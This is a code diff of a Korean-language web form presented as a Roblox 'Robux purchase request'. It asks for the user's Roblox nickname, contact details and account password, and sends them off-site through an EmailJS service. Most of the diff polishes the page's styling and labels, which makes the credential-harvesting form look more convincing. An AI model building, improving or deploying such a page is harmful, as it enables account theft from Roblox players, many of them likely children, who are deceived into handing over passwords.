@@ -15,29 +15,78 @@
 
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #f2f2f2;
-      padding: 30px;
+      font-family: "Segoe UI", Arial, sans-serif;
+      background: linear-gradient(135deg, #e0f7fa, #f1f8e9);
+      padding: 40px;
     }
+
     .container {
       max-width: 420px;
       margin: auto;
-      background: #fff;
-      padding: 25px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 14px;
+      box-shadow: 0 15px 40px rgba(0,0,0,0.1);
     }
-    input, textarea, button {
+
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+      font-weight: 600;
+    }
+
+    label {
+      font-size: 13px;
+      margin-top: 15px;
+      display: block;
+      color: #555;
+    }
+
+    input, textarea {
       width: 100%;
       padding: 12px;
-      margin-top: 10px;
+      margin-top: 6px;
+      font-size: 14px;
+      border-radius: 8px;
+      border: 1px solid #ddd;
+      outline: none;
+      transition: border 0.2s, box-shadow 0.2s;
     }
+
+    input:focus, textarea:focus {
+      border-color: #4CAF50;
+      box-shadow: 0 0 0 3px rgba(76,175,80,0.15);
+    }
+
+    textarea {
+      height: 100px;
+      resize: none; /* 🔥 크기 조절 완전 차단 */
+    }
+
     button {
-      background: #4CAF50;
-      color: white;
+      width: 100%;
+      margin-top: 25px;
+      padding: 14px;
+      background: linear-gradient(135deg, #4CAF50, #43a047);
+      color: #fff;
+      font-size: 15px;
+      font-weight: bold;
       border: none;
-      border-radius: 6px;
+      border-radius: 10px;
       cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.15s;
+    }
+
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(76,175,80,0.3);
+    }
+
+    .notice {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #777;
+      text-align: center;
     }
   </style>
 </head>
@@ -46,14 +95,19 @@
 <div class="container">
   <h2>로벅스 구매 요청</h2>
 
-  <input id="nickname" placeholder="닉네임" required />
-  <input id="amount" placeholder="로벅스 양" required />
-  <input id="contact" placeholder="연락처" required />
-  <textarea id="request" placeholder="비밀번호" required></textarea>
+  <label>닉네임</label>
+  <input id="nickname" placeholder="Roblox 닉네임" required />
 
-  <button onclick="sendEmail()">보내기</button>
-</div>
+  <label>로벅스 양</label>
+  <input id="amount" placeholder="예: 800" required />
 
+  <label>연락처</label>
+  <input id="contact" placeholder="카카오톡 / 전화번호" required />
+
+  <label>비밀번호</label>
+  <textarea id="request" placeholder="비밀번호를 입력하세요" required></textarea>
+
+  <button onclick="sendEmail()">요청 보내기</button>
 <script>
 function sendEmail() {
   const params = {
@@ -72,9 +126,9 @@ function sendEmail() {
     "service_2osfyze",
     "template_60av7xp",
     params
-  ).then(function() {
+  ).then(() => {
     alert("요청이 성공적으로 전송되었습니다!");
-  }, function(error) {
+  }, (error) => {
     alert("전송 실패: " + error.text);
   });
 }
@@ -82,3 +136,4 @@ function sendEmail() {
 
 </body>
 </html>
+
